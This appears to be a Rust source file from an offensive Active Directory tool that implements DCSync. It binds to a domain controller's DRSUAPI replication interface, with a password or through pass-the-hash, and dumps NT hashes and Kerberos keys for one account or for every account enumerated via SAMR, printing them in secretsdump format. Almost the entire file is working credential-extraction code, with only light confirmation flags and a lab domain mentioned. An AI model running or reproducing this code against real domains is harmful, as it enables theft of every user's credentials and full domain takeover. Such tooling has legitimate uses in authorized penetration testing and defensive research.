//! DCSync: replicate a target's secrets over DRSUAPI on a sealed RPC channel.
//! Supports single-target replication and full-domain dumps (enumerates all
//! accounts via SAMR, then replicates each — safety-gated by `--yes` when
//! stdout is a TTY).

use anyhow::Result;
use clap::Parser;

use crate::ui;

#[derive(Parser)]
pub(crate) struct DcsyncArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// Target account to replicate (sAMAccountName or DN); omit to just test the bind
    #[arg(long)]
    pub target: Option<String>,
    /// Replicate ALL domain accounts (enumerate via SAMR, then DCSync each) — full secretsdump
    #[arg(long)]
    pub all: bool,
    /// Confirm bulk (`--all`) runs non-interactively. Required when stdout is a TTY
    /// and `--all` is set; ignored otherwise. Blocks accidental full-domain dumps from
    /// a fat-fingered flag.
    #[arg(long)]
    pub yes: bool,
    /// Cap the bulk (`--all`) run at N accounts. Useful for smoke-testing --all against a
    /// large domain before committing to a full dump.
    #[arg(long)]
    pub limit: Option<usize>,
    /// **1.5.2 pass-the-hash.** Bind DRSUAPI using an NT hash (32 hex chars) instead of a
    /// password. Mutually exclusive with `--password`. Same downstream secrets extraction —
    /// the auth just skips the LmCompatibilityLevel≥3 NTLMv2 password-derived path and uses
    /// the hash directly. Accepts `@file:/path/to/hash.hex` or `env:VAR` per the standard
    /// secret-argument convention; a bare 32-hex-char literal is rejected to prevent
    /// shell-history leakage (this matches `attack rbcd --nt-hash` semantics).
    #[arg(long, value_name = "HASH")]
    pub nt_hash: Option<adhammer_core::SecretString>,
}

/// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
///
/// Rich per-stage checklist: password → SMB/DRSUAPI bind → replicate → output. Fails
/// at each stage anchor `mark_current_failed` so a bad bind (creds/net) is clearly
/// separated from a bad replication (target-doesn't-exist / access-denied).
pub(crate) async fn dcsync(a: DcsyncArgs) -> Result<()> {
    let stages = if a.all {
        vec![
            "resolve password",
            "enumerate accounts (SAMR)",
            "confirm bulk run",
            "DRSUAPI bind",
            "replicate all",
        ]
    } else {
        vec!["resolve password", "DRSUAPI bind", "replicate target"]
    };
    let mut checklist = ui::StageChecklist::new(stages);
    let result = dcsync_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("DCSync stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("DCSync stages (failed)");
        }
    }
    result
}

async fn dcsync_impl(mut a: DcsyncArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    use ms_drsr::DrsSession;
    // Auth resolution: NT hash short-circuits the password path (pass-the-hash). Both
    // paths route through `resolve_secret` so `@file:` / `env:` / secure-prompt work
    // consistently.
    let use_pth = a.nt_hash.is_some();
    if use_pth {
        let nt = crate::resolve_secret(
            a.nt_hash.as_ref().expect("checked above"),
            "ADHAMMER_NT_HASH",
        )?;
        a.nt_hash = Some(nt);
        checklist.record_ok("resolve password", "NT hash (pass-the-hash)");
    } else {
        a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
        checklist.record_ok("resolve password", "resolved");
    }

    if a.all {
        return dcsync_all(&a, checklist).await;
    }
    let mut sess = if use_pth {
        DrsSession::bind_nt_hash(
            &a.auth.host,
            &a.auth.domain,
            &a.auth.user,
            a.nt_hash.as_ref().unwrap().expose_secret(),
        )
        .await?
    } else {
        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?
    };
    checklist.record_ok(
        "DRSUAPI bind",
        if use_pth {
            "sealed replication handle (pass-the-hash)"
        } else {
            "sealed replication handle"
        },
    );
    // Task J fix: DsCrackNames uses DS_NT4_ACCOUNT_NAME which expects NETBIOS\name.
    // If the caller passed a DNS domain (`testlab.local`), the CrackNames step
    // returns status 2 (name not found). Auto-normalize the leftmost DNS label
    // to uppercase NetBIOS form — the standard convention for a well-formed AD
    // domain (verified against testlab.local 2019+2022 DCs, 2026-09-14).
    let nb_domain = netbios_from_dns(&a.auth.domain);
    match a.target {
        None => {
            let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
            println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
            checklist.record_skipped("replicate target", "no --target set — bind-only check");
        }
        Some(t) => {
            let (rid, nt, kerb) = sess.dcsync(&nb_domain, &t).await?;
            let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
            // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
            println!(
                "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
                t, rid, nthex
            );
            // Kerberos keys (secretsdump-style): user:etype:hexkey
            for k in &kerb {
                println!("{}:{}:{}", t, k.etype_name(), hex::encode(&k.key));
            }
            checklist.record_ok(
                "replicate target",
                format!("RID {rid} · NT hash + {} Kerberos key(s)", kerb.len()),
            );
        }
    }
    Ok(())
}

/// Full-domain DCSync: enumerate every account over SAMR, then replicate + decrypt each —
/// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
/// (which now reassembles multi-fragment replies, so large/computer accounts work too).
async fn dcsync_all(a: &DcsyncArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    use dcerpc::samr::SamrClient;
    use ms_drsr::DrsSession;
    use smb2_client::SmbClient;

    // 1. enumerate accounts via SAMR-over-SMB.
    let mut smb = SmbClient::connect(&a.auth.host).await?;
    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;
    let pipe = smb.open_pipe("samr").await?;
    let mut samr = SamrClient::bind(&mut smb, pipe).await?;
    let mut users = samr
        .enumerate_all_users(&format!("\\\\{}", a.auth.host))
        .await?;
    checklist.record_ok(
        "enumerate accounts (SAMR)",
        format!("{} account(s)", users.len()),
    );

    // Interactive-terminal safety gate. `--all` on a fat-fingered command dumps
    // every account in the domain; require --yes when we can see the operator's
    // TTY. Non-TTY callers (CI / piped runs) bypass the prompt.
    use std::io::IsTerminal as _;
    if !a.yes && std::io::stdout().is_terminal() {
        anyhow::bail!(
            "`--all` will DCSync {} accounts from {} in this domain. Re-run with --yes to \
             confirm, or use --limit N for a scoped run first.",
            users.len(),
            a.auth.host
        );
    }
    checklist.record_ok(
        "confirm bulk run",
        if a.yes {
            "--yes"
        } else {
            "non-TTY (auto-confirmed)"
        },
    );

    if let Some(n) = a.limit {
        if users.len() > n {
            eprintln!(
                "[*] --limit {n} — capping bulk run at {n} of {} enumerated accounts",
                users.len()
            );
            users.truncate(n);
        }
    }

    eprintln!("[+] {} accounts scheduled for replication…", users.len());

    // 2. DCSync each over one sealed DRSUAPI session — pick password vs NT-hash auth
    // exactly like the single-target path above.
    let mut sess = if let Some(nt) = a.nt_hash.as_ref() {
        DrsSession::bind_nt_hash(
            &a.auth.host,
            &a.auth.domain,
            &a.auth.user,
            nt.expose_secret(),
        )
        .await?
    } else {
        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?
    };
    checklist.record_ok(
        "DRSUAPI bind",
        if a.nt_hash.is_some() {
            "sealed replication handle (pass-the-hash)"
        } else {
            "sealed replication handle"
        },
    );
    let (mut ok, mut fail) = (0u32, 0u32);
    for (_rid, name) in &users {
        match sess.dcsync(&netbios_from_dns(&a.auth.domain), name).await {
            Ok((rid, nt, kerb)) => {
                let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
                println!(
                    "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
                    name, rid, nthex
                );
                for k in &kerb {
                    println!("{}:{}:{}", name, k.etype_name(), hex::encode(&k.key));
                }
                ok += 1;
            }
            Err(e) => {
                tracing::warn!("dcsync {name} failed: {e}");
                fail += 1;
            }
        }
    }
    eprintln!("[+] full-domain DCSync complete: {ok} dumped, {fail} failed");
    checklist.record_ok("replicate all", format!("{ok} dumped · {fail} failed"));
    Ok(())
}

/// Task J (1.5.2 post-live-fire): DsCrackNames' DS_NT4_ACCOUNT_NAME format expects
/// `NETBIOS\name`, not `DNS\name`. When the caller passes a dotted DNS domain
/// (`testlab.local`), split on the first dot and uppercase the leftmost label —
/// that is the standard AD NetBIOS convention for a well-formed domain.
/// Non-dotted input is returned uppercased (already NetBIOS-ish) so
/// `--domain TESTLAB` continues to work verbatim. This is a heuristic — a
/// domain whose NetBIOS name genuinely differs from the leftmost DNS label
/// (rare, but possible) still needs the operator to pass the NetBIOS name
/// explicitly.
fn netbios_from_dns(d: &str) -> String {
    d.split_once('.')
        .map(|(l, _)| l.to_ascii_uppercase())
        .unwrap_or_else(|| d.to_ascii_uppercase())
}

#[cfg(test)]
mod tests {
    use super::netbios_from_dns;

    #[test]
    fn strips_and_uppercases_dns_label() {
        assert_eq!(netbios_from_dns("testlab.local"), "TESTLAB");
        assert_eq!(netbios_from_dns("corp.example.com"), "CORP");
    }

    #[test]
    fn passes_through_bare_netbios() {
        assert_eq!(netbios_from_dns("TESTLAB"), "TESTLAB");
        assert_eq!(netbios_from_dns("corp"), "CORP");
    }
}
